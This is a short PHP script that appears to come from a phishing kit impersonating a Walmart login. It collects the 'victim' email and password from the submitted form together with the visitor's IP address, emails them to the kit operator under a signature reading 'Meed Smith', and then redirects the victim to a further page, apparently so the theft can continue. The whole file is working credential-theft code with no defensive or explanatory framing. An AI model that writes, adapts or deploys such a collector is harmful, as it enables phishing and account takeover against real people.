<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "==========[BY Meed Smith]=========<br>\n";
$message .= "ViCtIm E-mail    : ".$_POST['1']."<br>\n";
$message .= "ViCtIm Password  : ".$_POST['2']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY Meed Smith]=========<br>";

include '../e-mail.php';
$subject = "> Walmart Login - [$ip]";
$headers = "From: ~Meed-Smith~ <The.GrXn0v@support.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";


mail($to, $subject, $message,$headers);

header("Location: ../info.php");

?>
